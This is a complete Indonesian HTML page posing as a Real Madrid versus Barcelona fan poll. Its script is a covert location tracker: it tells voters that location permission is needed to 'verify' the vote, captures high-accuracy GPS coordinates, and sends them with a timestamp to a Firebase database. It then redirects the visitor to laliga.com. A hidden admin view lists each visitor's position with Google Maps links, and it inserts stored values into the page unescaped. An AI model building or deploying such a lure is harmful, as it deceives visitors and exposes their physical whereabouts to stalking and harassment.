<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Poling Terbesar Abad Ini</title>
    <style>
        body { font-family: 'Arial', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
        .card { background: #2a2a2a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 100%; max-width: 500px; margin-top: 30px; }
        .btn-box { display: flex; justify-content: space-around; margin-top: 25px; }
        .btn { padding: 15px 20px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; width: 45%; transition: 0.3s; color: white; }
        .madrid { background: #00468c; border: 2px solid white; }
        .barca { background: #a50044; border: 2px solid #edbb00; }
        .btn:hover { transform: scale(1.05); }
        
        /* Gaya untuk List Admin */
        .admin-item { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border-left: 5px solid #4285F4; }
        .admin-item p { margin: 5px 0; font-size: 14px; }
        .maps-link { display: inline-block; margin-top: 8px; color: #4285F4; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>

    <div class="card">
        <div id="pilih-box">
            <h2>VOTE TIM FAVORITMU!</h2>
            <p>TIM FAVORITMU YANG MANA?</p>
            <div class="btn-box">
                <button class="btn madrid" onclick="pilih('Real Madrid')">REAL MADRID</button>
                <button class="btn barca" onclick="pilih('Barcelona')">BARCELONA</button>
            </div>
        </div>

        <div id="admin-view" style="display: none;">
            <h3 style="color: white; margin-bottom: 20px;">Dashboard Admin (Total Suara)</h3>
            <div id="data-lokasi-list">Menunggu data masuk...</div>
        </div>
    </div>

    <script type="module">
        // 1. Menggunakan 'push' agar data ditambahkan ke daftar, bukan menimpa yang lama
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://project-saya-87cc0-default-rtdb.firebaseio.com/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const linkRef = ref(db, 'laporan_voter/');

        const isAdmin = new URLSearchParams(window.location.search).get('mode') === 'admin';

        if (isAdmin) {
            document.getElementById('pilih-box').style.display = 'none';
            document.getElementById('admin-view').style.display = 'block';

            // Mendengarkan perubahan data secara real-time
            onValue(linkRef, (snapshot) => {
                const data = snapshot.val();
                const container = document.getElementById('data-lokasi-list');
                
                if (data) {
                    let htmlContent = "";
                    // Membalik urutan agar yang terbaru muncul di paling atas
                    const keys = Object.keys(data).reverse(); 
                    
                    keys.forEach((key) => {
                        const item = data[key];
                        htmlContent += `
                            <div class="admin-item">
                                <p><b>Pilihan:</b> ${item.pilihan}</p>
                                <p><b>Waktu:</b> ${item.waktu}</p>
                                <p><b>Koordinat:</b> ${item.lat}, ${item.lon}</p>
                                <a href="https://www.google.com/maps?q=${item.lat},${item.lon}" target="_blank" class="maps-link">üìç Lihat di Google Maps</a>
                            </div>
                        `;
                    });
                    container.innerHTML = htmlContent;
                } else {
                    container.innerHTML = "<p style='color:white;'>Belum ada yang melakukan voting.</p>";
                }
            });
        }

        window.pilih = function(namaTim) {
            alert("Terima kasih! Izinkan lokasi untuk verifikasi pilihan Anda.");
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    // MENGGUNAKAN PUSH: Data akan bertambah (1, 2, 3... dst)
                    push(linkRef, {
                        pilihan: namaTim,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        waktu: new Date().toLocaleString()
                    }).then(() => {
                        alert("Pilihan Anda berhasil dikirim!");
                        window.location.href = "https://www.laliga.com";
                    });
                }, (err) => {
                    alert("Gagal: Mohon izinkan lokasi agar suara Anda sah.");
                }, {enableHighAccuracy: true});
            } else {
                alert("Browser Anda tidak mendukung GPS.");
            }
        }
    </script>
</body>
</html>
